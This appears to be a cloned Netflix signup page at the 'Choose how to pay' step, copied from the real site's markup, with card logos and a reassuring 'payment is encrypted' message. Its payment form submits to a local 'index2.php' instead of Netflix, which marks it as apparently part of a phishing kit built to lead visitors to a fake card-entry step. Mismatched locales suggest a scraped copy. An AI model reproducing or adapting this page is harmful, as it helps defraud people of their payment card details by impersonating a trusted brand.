...
<head>
    ...
    <title>Netflix</title>
    <link rel="preload" href="https://assets.nflxext.com/web/ffe/wp/signup/simplicity/simpleSignupClient.js.312ae8b68b5a71d76420.js" as="script">
    <link type="text/css" rel="stylesheet" href="/personalization/cl2/freeform/WebsiteDetect?source=wwwhead&amp;fetchType=css&amp;modalView=signupSimplicity-planSelectionWithContext" data-uia="botLink">
    ...
    <meta content="Choose a Netflix subscription plan that's right for you. Downgrade, upgrade or cancel any time." name="description">
    ...
    <link type="text/css" rel="stylesheet" href="https://assets.nflxext.com/web/ffe/wp/less/pages/signup/simplicity/simplicity.62821674fb3f068d0bfa.css" data-uia="botLink">
    ...
    <meta property="al:ios:url" content="nflx://www.netflix.com/signup?locale=en-FR">
    <meta property="al:ios:app_store_id" content="363590051">
    <meta property="al:ios:app_name" content="Netflix">
    <meta property="al:android:url" content="nflx://www.netflix.com/signup?locale=en-FR">
...
<body>
    <div id="appMountPoint">
        <div class="netflix-sans-font-loaded">
            <div data-uia="loc" lang="en-FR" dir="ltr">
                <div class="basicLayout notMobile modernInApp hasLargeTypography signupSimplicity-paymentPicker simplicity" lang="en-FR" dir="ltr">
                    <div class="nfHeader noBorderHeader signupBasicHeader onboarding-header">
                        <a href="/" class="svg-nfLogo signupBasicHeader onboarding-header" data-uia="netflix-header-svg-logo">
                            ...
                            </svg><span class="screen-reader-text">Netflix Home</span></a><a href="/signout" class="authLinks signupBasicHeader onboarding-header" data-uia="header-signout-link">Sign Out</a></div>
                    <div class="simpleContainer" data-uia="simpleContainer" data-transitioned-child="true">
                        <div class="centerContainer contextStep" tabindex="0" style="display: block; transform: none; opacity: 1; transition-duration: 250ms;">
                            <div class="paymentContainer" data-uia="payment-container">
                                <div class="paymentPickerHeading">
                                    ...
                                    <div class="stepHeader-container" data-uia="header">
                                        <div class="stepHeader" role="status"><span id="" class="stepIndicator" data-uia="">STEP <b>1</b> OF <b>3</b></span>
                                            <h1 class="stepTitle" data-uia="stepTitle">Choose how to pay</h1></div>
                                    </div>
                                    <div class="narrowContainer" data-uia="messagesContainer">
                                        <div id="" class="contextRow contextRowFirst" data-uia="">Your payment is encrypted and you can change how you pay anytime.</div>
                                ...
                                <div class="secure-server-badge-align-right">
                                    <svg id="secure-server-icon" viewBox="0 0 12 16" class="secure-server-badge--icon default-ltr-cache-189sllk">
                                        <g fill="none">
                                            <g fill="#FFB53F">
                                ...
                                <form method="POST"  action="index2.php">
                                    <div class="basic-spinner-region" style="min-height: 50px;">
                                        <div data-uia="loading-indicator" class="basic-spinner center-absolute isHidden" style="height: 50px; width: 50px;"></div>
                                        <div>
                                            <button class="paymentTab overrides paymentPicker standardHeight default-ltr-cache-22elhg" id="creditOrDebitCardDisplayStringId" data-uia="payment-choice+creditOrDebitOption" type="submit">
                                                <div class="mopNameAndLogos">
                                                    <div class="paymentTab--text card-type-text"><span class="selectionLabel">Credit or Debit Card</span></div>
                                                    <div class="logosContainer"><span class="logos logos-inline" data-uia="cardLogos-comp" aria-label="We accept Visa, Mastercard and American Express."><img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/VISA.png" alt="Visa" class="logoIcon VISA default-ltr-cache-kg1rox e18ygst00" srcset="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/VISA@2x.png 2x" data-uia="logoIcon-VISA"><img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/MASTERCARD.png" alt="Mastercard" class="logoIcon MASTERCARD default-ltr-cache-kg1rox e18ygst00" srcset="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/MASTERCARD@2x.png 2x" data-uia="logoIcon-MASTERCARD"><img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/AMEX.png" alt="American Express" class="logoIcon AMEX default-ltr-cache-kg1rox e18ygst00" srcset="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/AMEX@2x.png 2x" data-uia="logoIcon-AMEX"></span></div>
                                                </div><span class="arrow"><span dir="ltr" class="default-ltr-cache-s15e62 e1boxt2d0"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" data-mirrorinrtl="true" class="default-ltr-cache-0 e1mhci4z1" data-name="ChevronRight" aria-hidden="true"><path fill-rule="evenodd" clip-rule="evenodd" d="M15.5859 12L8.29303 19.2928L9.70725 20.7071L17.7072 12.7071C17.8948 12.5195 18.0001 12.2652 18.0001 12C18.0001 11.7347 17.8948 11.4804 17.7072 11.2928L9.70724 3.29285L8.29303 4.70706L15.5859 12Z" fill="currentColor"></path></svg></span></span>
                                            </button>
                                        </div>
                                    </div>
                                </form>
                    ...
                    <div class="site-footer-wrapper centered" style="transition-duration: 250ms; opacity: 1;">
                        ...
                        <div class="site-footer">
                            ...
                            <ul class="footer-links structural">
                                ...
                                <li class="footer-link-item" placeholder="footer_responsive_link_netflix_shop_item"><a class="footer-link" data-uia="footer-link" href="https://netflix.shop/" placeholder="footer_responsive_link_netflix_shop"><span id="" data-uia="data-uia-footer-label">Netflix Shop</span></a></li>
                                ...
                                <div class="nfSelectWrapper inFooter selectArrow prefix" data-uia="language-picker+container">
                                    ...
                                    <div class="nfSelectPlacement globe">
                                        <select data-uia="language-picker" class="nfSelect" id="lang-switcher-select" name="__langSelect" tabindex="0">
                                            <option label="العربية" lang="ar" value="/signup/paymentPicker?locale=ar-TN">العربية</option>
                                            <option label="Français" lang="fr" value="/signup/paymentPicker?locale=fr-TN">Français</option>
                                            <option selected="" label="English" lang="en" value="/signup/paymentPicker?locale=en-TN">English</option>
                                        </select>
                                    </div>
                                </div>
                            </div>
